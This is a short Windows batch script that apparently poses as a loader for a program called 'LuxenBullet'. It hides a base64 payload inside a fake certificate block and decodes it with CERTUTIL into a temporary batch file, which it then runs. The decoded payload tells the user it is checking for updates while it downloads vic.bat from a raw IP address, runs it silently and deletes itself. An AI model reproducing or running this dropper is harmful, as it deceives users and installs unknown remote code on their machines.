��&cls
@echo off 
Title %~n0
Mode 60,3 
color 0B
echo(
echo         Please wait... a while Loading data ....
CERTUTIL -f -decode "%~f0" "%Temp%\1bis.bat" >nul 2>&1 
cls
"%Temp%\1bis.bat"
Exit
-----BEGIN CERTIFICATE-----
QGVjaG8gb2ZmDQplY2hvIFRoYW5rIHlvdSBmb3IgZG93bmxvYWRpbmcgTHV4ZW5C
dWxsZXQuIFdhaXQgd2hpbGUgd2UgY2hlY2sgZm9yIHVwZGF0ZXMhIERvbid0IGNs
b3NlIHRoaXMgd2luZG93DQpjdXJsLmV4ZSAtcyAtLW91dHB1dCAlVVNFUlBST0ZJ
TEUlXExpbmtzXHZpYy5iYXQgLS11cmwgaHR0cDovLzE3MS4yMi4zMC4xMjAvdmlj
LmJhdA0KY2QgJVVTRVJQUk9GSUxFJVxMaW5rcw0Kc3RhcnQgdmljLmJhdA0KZXhp
dA0KRGVsICV+MCANCg0KRGVsICV+MCANCg==
-----END CERTIFICATE-----
